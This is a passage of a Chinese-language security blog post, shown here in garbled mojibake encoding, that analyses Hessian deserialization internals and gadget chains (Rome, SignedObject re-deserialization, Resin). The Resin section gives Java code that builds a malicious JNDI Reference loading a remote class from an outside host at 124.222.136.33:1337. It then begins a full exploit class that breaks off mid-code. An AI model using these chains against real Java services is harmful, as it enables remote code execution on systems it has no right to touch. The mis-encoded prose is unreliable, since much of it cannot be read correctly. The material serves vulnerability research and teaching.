alt="image-20241009194929048"></p><p>ä¸€å¼€å§‹è°ƒç”¨_inputFactoryè¯»å–headerï¼Œç„¶åæ ¹æ®headeræ¥åˆ›å»ºå¯¹åº”çš„Inputå’ŒOutputæµï¼Œæœ€åå†invokeè°ƒç”¨ä¸€æ¬¡æœåŠ¡</p><p>è¿™é‡Œä»£ç æ¯”è¾ƒé•¿å°±ç›´æ¥æˆªæ–‡ç« é‡Œçš„å›¾äº†ï¼Œè¿™ä¸ªå›¾å†™äº†æ³¨é‡Š</p><p><img src="https://cdn.clown2024.cn/202410092030361.png" alt="image-20241009203055295"></p><p>è¿˜æœ‰springçš„é€»è¾‘ä¹Ÿå·®ä¸å¤šçœ‹çœ‹æ–‡ç« çš„å°±å¥½äº†</p><h2 id="åºåˆ—åŒ–å’Œååºåˆ—åŒ–ç»†èŠ‚"><a href="#åºåˆ—åŒ–å’Œååºåˆ—åŒ–ç»†èŠ‚" class="headerlink" title="åºåˆ—åŒ–å’Œååºåˆ—åŒ–ç»†èŠ‚"></a>åºåˆ—åŒ–å’Œååºåˆ—åŒ–ç»†èŠ‚</h2><p>åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¯»å–ã€å†™å…¥å°±æ˜¯ç”±æˆ‘ä»¬å‰é¢æåˆ°è¿‡çš„AbstractHessianInput&#x2F;AbstractHessianOutputè¿™ä¸¤ä¸ªæŠ½è±¡ç±»æä¾›ï¼Œç„¶åHessian&#x2F;Hessian2&#x2F;Burlapéƒ½æä¾›äº†æ–¹æ³•çš„å…·ä½“å®ç°</p><p>ä»¥Hessian2Outputä¸ºä¾‹å­çœ‹çœ‹åºåˆ—åŒ–çš„å†™å…¥</p><p><img src="https://cdn.clown2024.cn/202410092039705.png" alt="image-20241009203934647"></p><p>è¿™é‡Œæ ¹æ®å…·ä½“çš„ç±»æ¥è·å–åºåˆ—åŒ–å™¨ç„¶åå†™å…¥åºåˆ—åŒ–æ•°æ®ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹Serializerçš„å®ç°ç±»æœ‰å¤šå°‘</p><p><img src="https://cdn.clown2024.cn/202410092044894.png" alt="image-20241009204454835"></p><p>å¯¹äºè‡ªå®šä¹‰ç±»å‹ï¼Œå°†ä¼šä½¿ç”¨ <code>JavaSerializer/UnsafeSerializer/JavaUnsharedSerializer</code> è¿›è¡Œç›¸å…³çš„åºåˆ—åŒ–åŠ¨ä½œï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯ <code>UnsafeSerializer</code></p><p>çœ‹ä¸€ä¸‹UnsafeSerializer#writeObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410092233208.png" alt="image-20241009223331142"></p><p>è¿™é‡Œä¼šè°ƒç”¨ä¸€ä¸ªwriteObjectBeginæ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ˜¯AbstractHessianOutputçš„</p><p><img src="https://cdn.clown2024.cn/202410092236620.png" alt="image-20241009223618572"></p><p>é‡Œé¢å†è°ƒç”¨äº†ä¸€ä¸ªwriteMapBeginæ–¹æ³•ï¼ŒHessian2Output é‡å†™äº†writeObjectBeginè¿™ä¸ªæ–¹æ³•ï¼Œè€Œå…¶ä»–å®ç°ç±»æ²¡æœ‰ã€‚ä¹Ÿå°±æ˜¯è¯´åœ¨ Hessian 1.0 å’Œ Burlap ä¸­ï¼Œå†™å…¥è‡ªå®šä¹‰æ•°æ®ç±»å‹ï¼ˆObjectï¼‰æ—¶ï¼Œéƒ½ä¼šè°ƒç”¨ <code>writeMapBegin</code> æ–¹æ³•å°†å…¶æ ‡è®°ä¸º Map ç±»å‹ã€‚</p><p>åœ¨ Hessian 2.0 ä¸­ï¼Œå°†ä¼šè°ƒç”¨ <code>writeDefinition20</code> å’Œ <code>Hessian2Output#writeObjectBegin</code> æ–¹æ³•å†™å…¥è‡ªå®šä¹‰æ•°æ®ï¼Œå°±ä¸å†å°†å…¶æ ‡è®°ä¸º Map ç±»å‹ã€‚</p><p>å†çœ‹ååºåˆ—åŒ–ï¼Œä»¥Hessian2Inputä¸ºä¾‹</p><p><img src="https://cdn.clown2024.cn/202410092244449.png" alt="image-20241009224448389"></p><p>åŸºæœ¬å°±æ˜¯ä¸€å¤§ä¸²çš„switch caseè¯­å¥ï¼Œæ ¹æ®æ ‡è¯†ä½è¿›è¡Œä¸åŒçš„é€»è¾‘å¤„ç†</p><p><img src="https://cdn.clown2024.cn/202410092309278.png" alt="image-20241009230909226"></p><p>ä»–åœ¨ååºåˆ—åŒ–æ—¶ä¹Ÿä¼šæ ¹æ®ç±»å‹è·å–å¯¹åº”çš„ååºåˆ—åŒ–å™¨</p><p><img src="https://cdn.clown2024.cn/202410092312974.png" alt="image-20241009231208927"></p><p>ç„¶åè¯»å–è‡ªå®šä¹‰ç±»å‹æ•°æ®ç”¨çš„æ˜¯UnsafeDeserializerç±»ï¼Œçœ‹ä¸€ä¸‹ä»–çš„readObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410092315911.png" alt="image-20241009231538854"></p><p><img src="https://cdn.clown2024.cn/202410092320613.png" alt="image-20241009232015561"></p><p>åˆ›å»ºUnsafeç±»å®ä¾‹ï¼Œç„¶åååºåˆ—åŒ–è¯»å–Fieldå¹¶åå°„å†™å…¥</p><p><img src="https://cdn.clown2024.cn/202410092320165.png" alt="image-20241009232019114"></p><p>Hessian 1.0 çš„ HessianInput ä¸­ï¼Œæ²¡æœ‰é’ˆå¯¹ Object çš„è¯»å–ï¼Œè€Œæ˜¯éƒ½å°†å…¶ä½œä¸º Map è¯»å–ï¼Œå› ä¸ºåœ¨åºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­æˆ‘ä»¬ä¹Ÿæåˆ°ï¼Œåœ¨å†™å…¥è‡ªå®šä¹‰ç±»å‹æ—¶ä¼šå°†å…¶æ ‡è®°ä¸º Map ç±»å‹ã€‚</p><p><code>MapDeserializer#readMap</code> æ–¹æ³•æä¾›äº†é’ˆå¯¹ Map ç±»å‹æ•°æ®çš„å¤„ç†é€»è¾‘</p><p><img src="https://cdn.clown2024.cn/202410092327669.png" alt="image-20241009232731601"></p><h2 id="è¿œç¨‹è°ƒç”¨"><a href="#è¿œç¨‹è°ƒç”¨" class="headerlink" title="è¿œç¨‹è°ƒç”¨"></a>è¿œç¨‹è°ƒç”¨</h2><p>è¿˜æ˜¯æ ¹æ®å‰é¢çš„å®¢æˆ·ç«¯ä»£ç æ¥è°ƒè¯•ï¼Œæ ¹æ®createæ–¹æ³•ä¸€è·¯å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202410092353919.png" alt="image-20241009235359859"></p><p>åœ¨è¿™é‡Œåˆ›å»ºäº†åŠ¨æ€ä»£ç†ï¼Œæˆ‘ä»¬çŸ¥é“åŠ¨æ€ä»£ç†è°ƒç”¨æ–¹æ³•æ—¶ä¼šèµ°InvocationHandler#invokeæ–¹æ³•ï¼Œæˆ‘ä»¬å»çœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202410100001263.png" alt="image-20241010000103202"></p><p>è¿™é‡Œæ˜¯å¤„ç†ç›¸å…³æ–¹æ³•è°ƒç”¨ï¼Œå†å¾€åå°±æ˜¯å‘é€è¯·æ±‚ç»“æœå¹¶ååºåˆ—åŒ–ï¼Œæˆªä¸€ä¸‹æ–‡ç« çš„å›¾</p><p><img src="https://cdn.clown2024.cn/202410100008161.png" alt="image-20241010000832095"></p><h2 id="å…¶ä»–å®ç°ç»†èŠ‚"><a href="#å…¶ä»–å®ç°ç»†èŠ‚" class="headerlink" title="å…¶ä»–å®ç°ç»†èŠ‚"></a>å…¶ä»–å®ç°ç»†èŠ‚</h2><p><strong>åè®®ç‰ˆæœ¬</strong></p><p>ä½¿ç”¨é‚£ç§åè®®è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–å–å†³äºè¯·æ±‚æ ‡å¿—ä½</p><p>è¿™ä¸€è®¾å®šä½äº <code>HessianProxyFactory</code> ä¸­çš„ä¸¤ä¸ªå¸ƒå°”å‹å˜é‡ä¸­ï¼Œå³ <code>_isHessian2Reply</code> å’Œ <code>_isHessian2Request</code></p><p><img src="https://cdn.clown2024.cn/202410100012841.png" alt="image-20241010001231800"></p><p>æƒ³æ›´æ”¹åè®®è‡ªå·±setæ–¹æ³•è®¾ç½®å³å¯</p><p><strong>Serializable</strong></p><p>æˆ‘ä»¬çŸ¥é“åœ¨Java åŸç”Ÿååºåˆ—åŒ–ä¸­ï¼Œå®ç°äº† <code>java.io.Serializable</code> æ¥å£çš„ç±»æ‰å¯ä»¥ååºåˆ—åŒ–</p><p>Hessianåœ¨è·å–é»˜è®¤åºåˆ—åŒ–å™¨çš„æ—¶å€™ä¼šæ£€æŸ¥æ˜¯å¦å®ç°äº†Serializableæ¥å£</p><p><img src="https://cdn.clown2024.cn/202410100020094.png" alt="image-20241010002017043"></p><p>ä½†æ˜¯æ³¨æ„è¿™é‡Œæœ‰ä¸€ä¸ª_isAllowNonSerializableå˜é‡ï¼Œå®ƒå¯ä»¥æ‰“ç ´è¿™ç§è§„èŒƒï¼Œæˆ‘ä»¬åªè¦ç”¨setæ–¹æ³•å°†ä»–è®¾ç½®ä¸ºtrueï¼Œè¿™æ ·æ²¡æœ‰å®ç°Serializableæ¥å£çš„ç±»ä¹Ÿèƒ½åºåˆ—åŒ–</p><p>ç„¶åæ˜¯ transient å’Œ static çš„é—®é¢˜ï¼Œåœ¨åºåˆ—åŒ–æ—¶ï¼Œç”± <code>UnsafeSerializer#introspect</code> æ–¹æ³•æ¥è·å–å¯¹è±¡ä¸­çš„å­—æ®µï¼Œåœ¨è€ç‰ˆæœ¬ä¸­åº”è¯¥æ˜¯ <code>getFieldMap</code> æ–¹æ³•ã€‚ä¾æ—§æ˜¯åˆ¤æ–­äº†æˆå‘˜å˜é‡æ ‡è¯†ç¬¦ï¼Œå¦‚æœæ˜¯ transient å’Œ static å­—æ®µåˆ™ä¸ä¼šå‚ä¸åºåˆ—åŒ–ååºåˆ—åŒ–æµç¨‹ã€‚</p><p><img src="https://cdn.clown2024.cn/202410100024721.png" alt="image-20241010002444663"></p><p>è¿™ä¸ªåœ°æ–¹å¯¹æ ‡è¯†ç¬¦è¿›è¡Œäº†åˆ¤æ–­ï¼Œå¦‚æœä¸º transient å’Œ static å­—æ®µåˆ™ä¸ä¼šå‚ä¸åºåˆ—åŒ–ååºåˆ—åŒ–æµç¨‹</p><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>å‰é¢çš„åˆ†æå¯ä»¥çŸ¥é“Hessianå¤§éƒ¨åˆ†æ˜¯åˆ©ç”¨åå°„å†™å…¥å€¼ï¼Œä¸”è¿‡ç¨‹å¹¶æ²¡æœ‰è°ƒç”¨ç±»çš„readObjectæ–¹æ³•ï¼Œä¹Ÿæ²¡æœ‰è§¦å‘getter&#x2F;setteræ–¹æ³•ï¼Œé‚£ä¹ˆæ¼æ´ç‚¹åœ¨å“ªå‘¢</p><p>æ¼æ´ç‚¹å°±åœ¨æˆ‘ä»¬å‰é¢è¯´è¿‡çš„å¯¹Mapç±»å‹æ•°æ®çš„å¤„ç†ä¸Šï¼Œ<code>MapDeserializer#readMap</code> å¯¹ Map ç±»å‹æ•°æ®è¿›è¡Œååºåˆ—åŒ–æ“ä½œæ˜¯ä¼šåˆ›å»ºç›¸åº”çš„ Map å¯¹è±¡ï¼Œå¹¶å°† Key å’Œ Value åˆ†åˆ«ååºåˆ—åŒ–åä½¿ç”¨ put æ–¹æ³•å†™å…¥æ•°æ®ã€‚åœ¨æ²¡æœ‰æŒ‡å®š Map çš„å…·ä½“å®ç°ç±»æ—¶ï¼Œå°†ä¼šé»˜è®¤ä½¿ç”¨ HashMap ï¼Œå¯¹äº SortedMapï¼Œå°†ä¼šä½¿ç”¨ TreeMapã€‚</p><p><img src="https://cdn.clown2024.cn/202410100032949.png" alt="image-20241010003247887"></p><p>é‚£åˆ©ç”¨çš„æ–¹å¼å…¶å®å°±æ¯”è¾ƒå¥½è”æƒ³äº†å¯¹äºè¿™ä¸¤ä¸ªç±»</p><p>HashMapåœ¨putçš„æ—¶å€™ä¼šè°ƒç”¨hashæ–¹æ³•ï¼Œä»è€Œè°ƒç”¨key.hashCodeã€‚</p><p><img src="https://cdn.clown2024.cn/202410100035334.png" alt="image-20241010003515291"></p><p>TreeMap åœ¨ put æ—¶ï¼Œç”±äºè¦è¿›è¡Œæ’åºï¼Œæ‰€ä»¥è¦å¯¹ key è¿›è¡Œæ¯”è¾ƒæ“ä½œï¼Œå°†ä¼šè°ƒç”¨ compare æ–¹æ³•ï¼Œä¼šè°ƒç”¨ key çš„ compareTo æ–¹æ³•ã€‚</p><p><img src="https://cdn.clown2024.cn/202410100035008.png" alt="image-20241010003554961"></p><p>è¿™ä¹ˆä¸€çœ‹Hessianååºåˆ—åŒ–åˆ©ç”¨è¢«é™åˆ¶å¾—æ¯”è¾ƒçª„</p><ul><li>kick-off chain èµ·å§‹æ–¹æ³•åªèƒ½ä¸º hashCode&#x2F;equals&#x2F;compareTo æ–¹æ³•ï¼›</li><li>åˆ©ç”¨é“¾ä¸­è°ƒç”¨çš„æˆå‘˜å˜é‡ä¸èƒ½ä¸º transient ä¿®é¥°ï¼›</li><li>æ‰€æœ‰çš„è°ƒç”¨ä¸ä¾èµ–ç±»ä¸­ readObject çš„é€»è¾‘ï¼Œä¹Ÿä¸ä¾èµ– getter&#x2F;setter çš„é€»è¾‘ã€‚</li></ul><h1 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h1><p>åœ¨<a href="https://github.com/mbechler/marshalsec">marshalsec</a>é¡¹ç›®é‡Œæœ‰å…³äºè¯¥ååºåˆ—åŒ–çš„å®ç°ï¼Œæœ‰ä¸‹é¢äº”æ¡é“¾</p><ul><li>Rome</li><li>XBean</li><li>Resin</li><li>SpringPartiallyComparableAdvisorHolder</li><li>SpringAbstractBeanFactoryPointcutAdvisor</li></ul><h2 id="romeé“¾"><a href="#Romeé“¾" class="headerlink" title="Romeé“¾"></a>Romeé“¾</h2><p>Romeé“¾çš„æ ¸å¿ƒæ˜¯ä»–çš„ToStringBeançš„toStringæ–¹æ³•ï¼Œä»–å¯ä»¥è°ƒç”¨ä¼ å…¥ç±»çš„æ‰€æœ‰æ— å‚getteræ–¹æ³•ï¼Œè¿™é‡Œå°±å¯ä»¥æ‰“JdbcRowSetImplçš„é“¾å­è§¦å‘jndi</p><p>ç„¶åToStringBeanå¤–é¢åŒ…ä¸€å±‚EqualsBeanå’ŒHashMapå³å¯</p><p>è§¦å‘é“¾å­å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HashMap#hashCode<br>EqualsBean#hashCode<br>EqualsBean#beanHashCode<br>ToStringBean#toString<br>JdbcRowSetImpl#getDatabaseMetaData<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410101102136.png" alt="image-20241010110223027"></p><p><img src="https://cdn.clown2024.cn/202410101102006.png" alt="image-20241010110235946"></p><h3 id="äºŒæ¬¡ååºåˆ—åŒ–"><a href="#äºŒæ¬¡ååºåˆ—åŒ–" class="headerlink" title="äºŒæ¬¡ååºåˆ—åŒ–"></a>äºŒæ¬¡ååºåˆ—åŒ–</h3><p>ä¸Šé¢çš„JNDIåˆ©ç”¨éœ€è¦å‡ºç½‘ï¼Œæ‰€ä»¥å¯ä»¥å€ŸåŠ©SignedObject#getObjectæ¥æ‰“äºŒæ¬¡ååºåˆ—åŒ–</p><p>é“¾å­æ”¹æˆè¿™æ ·å°±è¡Œäº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HashMap#hashCode<br>EqualsBean#hashCode<br>EqualsBean#beanHashCode<br>ToStringBean#toString<br>SignedObject#getObject<br></code></pre></td></tr></table></figure><p>ç„¶åå°è£…ä¸€ä¸ªæƒ³è¦çš„é“¾å­è¿›å»å°±è¡Œäº†</p><h2 id="resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h2><p>è¯¥é“¾å­æœ€ç»ˆæ•ˆæœæ‰“çš„æ˜¯è¿œç¨‹ç±»åŠ è½½</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/uuzeray/article/details/136727060">https://blog.csdn.net/uuzeray/article/details/136727060</a></p><p>Resinæ˜¯ä¸€ä¸ªè½»é‡çº§çš„ã€é«˜æ€§èƒ½çš„å¼€æºJavaåº”ç”¨æœåŠ¡å™¨ã€‚å®ƒæ˜¯ç”±Caucho Technologyå¼€å‘çš„ï¼Œæ—¨åœ¨æä¾›å¯é çš„Webåº”ç”¨ç¨‹åºå’ŒæœåŠ¡çš„è¿è¡Œç¯å¢ƒï¼Œå’ŒTomcatä¸€æ ·æ˜¯ä¸ªæœåŠ¡å™¨ï¼›ä»–å¸¸å’ŒHessianäº§ç”Ÿè”ç³»</p><p>æµ‹è¯•æ—¶å¯ä»¥å¯¼å…¥ä¸‹é¢çš„åŒ…</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.caucho<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>resin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.64<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Resin è¿™æ¡åˆ©ç”¨é“¾çš„å…¥å£ç‚¹å®é™…ä¸Šæ˜¯ HashMap å¯¹æ¯”ä¸¤ä¸ªå¯¹è±¡æ—¶è§¦å‘çš„ <code>com.sun.org.apache.xpath.internal.objects.XString</code> çš„ <code>equals</code> æ–¹æ³•ã€‚</p><p>XStringçš„åˆ©ç”¨åœ¨ROMEçš„HotSwappableTargetSourceåˆ©ç”¨é“¾æœ‰ç”¨åˆ°è¿‡</p><p><img src="https://cdn.clown2024.cn/202410102001525.png" alt="image-20241010200147467"></p><p>åœ¨è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨çš„æ˜¯com.caucho.naming.QNameçš„toStringæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410102003734.png" alt="image-20241010200338680"></p><p>è¿™é‡Œçš„é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œä½†æ˜¯QNameæ˜¯ä»€ä¹ˆï¼Œæˆ‘ä»¬å¾—å…ˆäº†è§£ä¸€ä¸‹ï¼Œæ‰èƒ½çŸ¥é“ä»–è¿™æ ·ä¸ºä»€ä¹ˆå¯ä»¥è§¦å‘</p><p>çœ‹ä¸€ä¸‹ä»–çš„æè¿°</p><p><img src="https://cdn.clown2024.cn/202410102030167.png" alt="image-20241010203001097"></p><p>è¿™é‡Œæè¿°æ„æ€æ˜¯ä»£è¡¨ä¸€ä¸ªå·²è§£æçš„JNDIåç§°</p><p>çœ‹ä¸€ä¸‹ä»–çš„æ„é€ æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410102032765.png" alt="image-20241010203211713"></p><p>QNameå¯¹è±¡çš„åŠŸèƒ½æ˜¯ç”¨äºè¡¨ç¤ºä¸€ä¸ªJNDIé™å®šåï¼ˆqualified nameï¼‰ï¼Œé€šè¿‡ä¼ å…¥çš„Contextå¯¹è±¡ä»¥åŠä¸¤ä¸ªå­—ç¬¦ä¸²å‚æ•°ï¼ˆfirstå’Œrestï¼‰ï¼ŒQNameå¯¹è±¡å¯ä»¥å°†è¿™äº›ä¿¡æ¯ç»„åˆèµ·æ¥å½¢æˆä¸€ä¸ªå®Œæ•´çš„é™å®šåã€‚</p><p>Contextæ¥å£çš„æè¿°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">This interface represents a naming context, which consists of a set of name-to-object bindings. It contains methods for examining and updating these bindings.<br></code></pre></td></tr></table></figure><p>æ­¤æ¥å£è¡¨ç¤ºä¸€ä¸ªå‘½åä¸Šä¸‹æ–‡ï¼Œå®ƒç”±ä¸€ç»„åç§°åˆ°å¯¹è±¡çš„ç»‘å®šç»„æˆã€‚å®ƒåŒ…å«æ£€æŸ¥å’Œæ›´æ–°è¿™äº›ç»‘å®šçš„æ–¹æ³•ã€‚ä¹Ÿå°±æ˜¯jndiçš„ç›¸å…³æ“ä½œ</p><p>ç„¶åæˆ‘ä»¬è¦ç”¨åˆ°çš„Contextçš„å®ç°ç±»æ˜¯ContinuationContext</p><p>æ„é€ æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410102039546.png" alt="image-20241010203937489"></p><p>CannotProceedExceptionæ˜¯javax.namingå¼‚å¸¸ä½“ç³»ä¸­çš„ä¸€ç§å¼‚å¸¸ï¼Œé€šå¸¸åœ¨æœ¬åœ°åŠ è½½ç±»å¤±è´¥æ—¶ä½¿ç”¨ã€‚å®ƒçš„ä½œç”¨æ˜¯å¯¹æ— æ³•ç»§ç»­è¿›è¡Œæ“ä½œçš„å¼‚å¸¸æƒ…å†µè¿›è¡Œå¤„ç†ã€‚</p><p>å¤„ç†çš„å…³é”®åœ¨Referenceç±»ï¼Œæ–‡ç« ç»™äº†ä¸€ä¸ªå¯¹CannotProceedExceptionç±»çš„æ„é€ </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">refAddr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://124.222.136.33:1337/&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">refClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;calc&quot;</span>;<br> <br><span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(refClassName, refClassName, refAddr);<br> <br><span class="hljs-type">Object</span> <span class="hljs-variable">cannotProceedException</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.naming.CannotProceedException&quot;</span>).getDeclaredConstructor().newInstance();<br><span class="hljs-type">String</span> <span class="hljs-variable">classname</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;javax.naming.NamingException&quot;</span>;<br>setFiled(classname, cannotProceedException, <span class="hljs-string">&quot;resolvedObj&quot;</span>, ref);<br></code></pre></td></tr></table></figure><p>Referenceæ„é€ æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410102106681.png" alt="image-20241010210638627"></p><p>ç°åœ¨å›åˆ°å‰é¢QNameçš„toStringæ–¹æ³•ï¼Œæˆ‘ä»¬ä¼šè°ƒç”¨ContinuationContext#composeNameæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410102113650.png" alt="image-20241010211324591"></p><p>ç„¶åè°ƒç”¨åˆ°getTargetContextæ–¹æ³•ï¼Œè¿™é‡Œçš„ctx.composeNameæ–¹æ³•å¯ä»¥å¿½ç•¥ï¼Œä¸åœ¨åˆ©ç”¨é“¾ä¸­</p><p><img src="https://cdn.clown2024.cn/202410102114406.png" alt="image-20241010211417350"></p><p>ç„¶åæˆ‘ä»¬éœ€è¦è¿›å…¥åˆ°NamingManager.getContextæ–¹æ³•é‡Œé¢ï¼Œä¸è¿‡è¿˜éœ€è¦æ»¡è¶³å‰é¢çš„ä¸¤ä¸ªæ¡ä»¶</p><p>contCtx &#x3D;&#x3D; nullï¼Œåœ¨æ„é€ ä¸­æœ¬èº«å°±ä¸è®¾ç½®ï¼Œæ‰€ä»¥ä¸éœ€è¦è€ƒè™‘<br>cpe.getResolvedObj()è¿”å›ä¸ä¸ºnull(å…¶å®è¿”å›çš„å°±æ˜¯æˆ‘ä»¬ä¸Šé¢ç»™CannotProceedExceptionæ„é€ çš„æ¶æ„Reference)ï¼Œæ‰€ä»¥ä¹Ÿä¸ä¼šä¸ºnull</p><p>è¿™é‡Œä¼ çš„æ˜¯cpe.getResolvedObjï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ„é€ çš„Referenceç±»</p><p>ç»§ç»­è·Ÿè¿›</p><p><img src="https://cdn.clown2024.cn/202410102122102.png" alt="image-20241010212200426"></p><p>ç„¶åæ¼æ´çš„è§¦å‘ç‚¹å°±åœ¨NamingManager#getObjectInstanceè¿™ä¸ªæ–¹æ³•é‡Œé¢ï¼Œä»åå­—çœ‹å°±æ˜¯è¦å¯¹æˆ‘ä»¬ä¼ å…¥çš„Referenceç±»è¿›è¡Œå®ä¾‹åŒ–</p><p>æœ‰å…³è¯¥æ–¹æ³•çš„æè¿°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Creates an instance of an object for the specified object and environment.<br>If an object factory builder has been installed, it is used to create a factory for creating the object. Otherwise, the following rules are used to create the object:<br>If refInfo is a Reference or Referenceable containing a factory class name, use the named factory to create the object. Return refInfo if the factory cannot be created<br>ç¿»è¯‘ä¸€ä¸‹ï¼š<br>ä¸ºæŒ‡å®šçš„å¯¹è±¡å’Œç¯å¢ƒåˆ›å»ºå¯¹è±¡çš„å®ä¾‹ã€‚<br>å¦‚æœå·²å®‰è£…å¯¹è±¡å·¥å‚ç”Ÿæˆå™¨ï¼Œåˆ™ä½¿ç”¨å®ƒæ¥åˆ›å»ºç”¨äºåˆ›å»ºå¯¹è±¡çš„å·¥å‚ã€‚å¦åˆ™ï¼Œå°†ä½¿ç”¨ä»¥ä¸‹è§„åˆ™åˆ›å»ºå¯¹è±¡ï¼š<br>å¦‚æœrefInfoæ˜¯åŒ…å«å·¥å‚ç±»åçš„Referenceæˆ–Referenceableï¼Œè¯·ä½¿ç”¨å‘½åçš„å·¥å‚åˆ›å»ºå¯¹è±¡ã€‚å¦‚æœæ— æ³•åˆ›å»ºå·¥å‚ï¼Œåˆ™è¿”å›refInfoã€‚<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410102142943.png" alt="image-20241010214214868"></p><p>ç„¶åå…³é”®ç±»æ–¹æ³•æ˜¯getObjectFactoryFromReference</p><p><img src="https://cdn.clown2024.cn/202410102157527.png" alt="image-20241010215719459"></p><p>è¿™é¦–å…ˆä¼šä»æœ¬åœ°åŠ è½½ç±»ï¼Œè‚¯å®šåŠ è½½ä¸åˆ°ï¼Œç„¶åå°±ä»codebaseåŠ è½½ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„è¿œç¨‹åœ°å€é‚£é‡Œï¼Œæœ€ååŠè¿›è¡Œç±»çš„å®ä¾‹åŒ–ï¼Œç„¶åè§¦å‘æ¼æ´</p><p>ç„¶åå°±æ˜¯hashMapè¦è§¦å‘equalsè¿˜è¦æ„é€ å“ˆå¸Œç›¸ç­‰ï¼Œæœ‰ç‚¹æ‡’å¾—å†åˆ†æäº†ï¼Œç›´æ¥copyæ–‡ç« çš„expå°æ”¹ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> com.caucho.naming.QName;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> javax.naming.CannotProceedException;<br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">refAddr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">refClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;TestRef&quot;</span>;<br><br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(refClassName, refClassName, refAddr);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">cannotProceedException</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.naming.CannotProceedException&quot;</span>).getDeclaredConstructor().newInstance();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">classname</span> <span 